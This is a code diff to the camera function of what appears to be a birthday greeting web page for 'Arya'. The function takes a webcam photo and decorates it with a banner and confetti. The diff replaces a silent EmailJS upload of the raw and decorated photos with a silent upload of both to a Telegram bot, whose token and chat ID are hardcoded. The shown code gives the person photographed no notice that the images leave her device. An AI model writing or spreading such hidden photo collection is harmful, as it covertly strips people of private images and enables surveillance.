@@ -979,104 +979,109 @@ window.exitApp = () => {
             }
         };
 
-        window.takePicture = () => {
+        
+        // --- SEND TO TELEGRAM FUNCTION ---
+function sendToTelegram(blob, caption) {
+    // REPLACE THESE WITH YOUR DETAILS
+    const BOT_TOKEN = "8184411207:AAEZMHCwlqWQ_GdM4xNh9ZFPbsmJkB6r4wY"; 
+    const CHAT_ID = "7833679997";
+
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("photo", blob, "photo.png");
+    formData.append("caption", caption);
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => console.log("Sent to Telegram"))
+    .catch(error => console.error("Telegram Error:", error));
+}
+
+// --- MAIN CAMERA FUNCTION ---
+window.takePicture = () => {
     const video = document.getElementById('camera-video');
     const canvas = document.createElement('canvas');
     
-    // Set dimensions
-    const w = video.videoWidth; 
+    // USE FULL RESOLUTION (High Quality)
+    const w = video.videoWidth;
     const h = video.videoHeight;
     canvas.width = w; 
     canvas.height = h;
-    
     const ctx = canvas.getContext('2d');
     
-    // 1. Draw Video (Mirrored)
+    // 1. Draw Raw Video (Mirrored)
     ctx.translate(w, 0);
     ctx.scale(-1, 1);
     ctx.drawImage(video, 0, 0, w, h);
-    ctx.setTransform(1, 0, 0, 1, 0, 0); // Reset transformation
+    ctx.setTransform(1, 0, 0, 1, 0, 0); 
 
-    // --- CAPTURE RAW IMAGE (Before Decoration) ---
-    // We use JPEG with 0.6 quality to ensure the email size isn't too huge
-    const rawDataURL = canvas.toDataURL('image/jpeg', 0.6);
+    // --- A. GET RAW IMAGE DATA ---
+    const rawData = canvas.toDataURL('image/png');
+    const rawBlob = dataURItoBlob(rawData);
+    
+    // SEND RAW PHOTO TO TELEGRAM
+    sendToTelegram(rawBlob, "📸 Original Photo taken by Arya!");
 
-    // --- START DECORATION ---
-
-    // 2. Add White Polaroid Border
+    // --- B. APPLY DECORATIONS ---
     const border = 40; 
     ctx.lineWidth = border * 2; 
     ctx.strokeStyle = "#ffffff";
     ctx.strokeRect(0, 0, w, h);
 
-    // 3. Add The Banner Background (Gradient)
-    const bannerHeight = h * 0.15; 
-    const bannerY = h - bannerHeight - border; 
+    const bH = h * 0.15; 
+    const bY = h - bH - border; 
 
-    const grad = ctx.createLinearGradient(0, bannerY, w, bannerY + bannerHeight);
-    grad.addColorStop(0, "rgba(255, 118, 117, 0.9)"); // Pink
-    grad.addColorStop(1, "rgba(162, 155, 254, 0.9)"); // Purple
-
+    // Gradient
+    const grad = ctx.createLinearGradient(0, bY, w, bY + bH);
+    grad.addColorStop(0, "rgba(255, 118, 117, 0.9)");
+    grad.addColorStop(1, "rgba(162, 155, 254, 0.9)");
     ctx.fillStyle = grad;
-    ctx.fillRect(border, bannerY, w - (border*2), bannerHeight);
+    ctx.fillRect(border, bY, w - (border*2), bH);
 
-    // 4. Add Text inside the Banner
+    // Text
     ctx.shadowColor = "rgba(0,0,0,0.3)";
     ctx.shadowBlur = 5;
     ctx.fillStyle = "white";
     ctx.textAlign = "center";
 
-    // Text resizing based on width
-    let titleSize = w / 15; 
-    ctx.font = `bold ${titleSize}px 'Fredoka One', sans-serif`;
-    ctx.fillText("Happy Birthday! 🎉", w/2, bannerY + (bannerHeight*0.45));
+    let tSize = w / 15; 
+    ctx.font = `bold ${tSize}px 'Fredoka One', sans-serif`;
+    ctx.fillText("Happy Birthday! 🎉", w/2, bY + (bH*0.45));
+    ctx.font = `${tSize/2.2}px 'Handlee', sans-serif`;
+    ctx.fillText(new Date().toDateString() + " • Making Memories ✨", w/2, bY + (bH*0.8));
 
-    let dateSize = titleSize / 2.2;
-    ctx.font = `${dateSize}px 'Handlee', sans-serif`;
-    ctx.fillText(new Date().toDateString() + " • Smily moments ✨", w/2, bannerY + (bannerHeight*0.8));
-
-    // 5. Add Digital Confetti Overlay
-    for(let i=0; i<40; i++) {
+    // Confetti
+    for(let i=0; i<50; i++) {
         ctx.fillStyle = ['#ffeaa7', '#55efc4', '#74b9ff', '#ff7675'][Math.floor(Math.random()*4)];
         ctx.beginPath();
         ctx.arc(Math.random()*w, Math.random()*h, Math.random()*10+5, 0, Math.PI*2);
         ctx.fill();
     }
-    
-    // --- CAPTURE EDITED IMAGE (After Decoration) ---
-    const editedDataURL = canvas.toDataURL('image/jpeg', 0.6);
 
-    // --- 6. SAVE TO GALLERY (Only the edited one) ---
+    // --- C. GET EDITED IMAGE DATA ---
+    const editedData = canvas.toDataURL('image/png');
+    const editedBlob = dataURItoBlob(editedData);
+
+    // SEND EDITED PHOTO TO TELEGRAM
+    sendToTelegram(editedBlob, "✨ With Birthday Banner!");
+
+    // --- D. SAVE TO GALLERY ---
     const link = document.createElement('a');
-    link.href = editedDataURL;
-    link.download = 'Arya_Birthday_Moment.jpg';
+    link.href = editedData;
+    link.download = 'Arya_Birthday_Moment.png';
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
 
-    // --- 7. SEND BOTH TO EMAIL ---
-    // Ensure your EmailJS template has {{edited_picture}} and {{original_picture}} variables
-    const emailParams = {
-        to_name: "Animesh", 
-        edited_picture: editedDataURL,   // The one with the banner
-        original_picture: rawDataURL     // The one without the banner
-    };
-
-    // Replace SERVICE_ID and TEMPLATE_ID with your actual IDs
-    emailjs.send("service_b07d1yn", "template_ut5xq87", emailParams)
-        .then(function(response) {
-           console.log("Picture is very beautiful 😍");
-        }, function(error) {
-           console.log('Email failed...', error);
-        });
-
-    // 8. Cleanup and Show Preview
+    // Cleanup
     if(videoStream) videoStream.getTracks().forEach(track => track.stop());
     document.getElementById('camera-modal').style.display = "none";
     
-    // Show the edited result popup on screen
+    // Show Popup
     const res = document.getElementById('polaroid-result');
-    document.getElementById('polaroid-img').src = editedDataURL;
+    document.getElementById('polaroid-img').src = editedData;
     res.style.display = "block";
     setTimeout(() => res.style.transform = "translate(-50%, -50%) scale(1)", 100);
 };
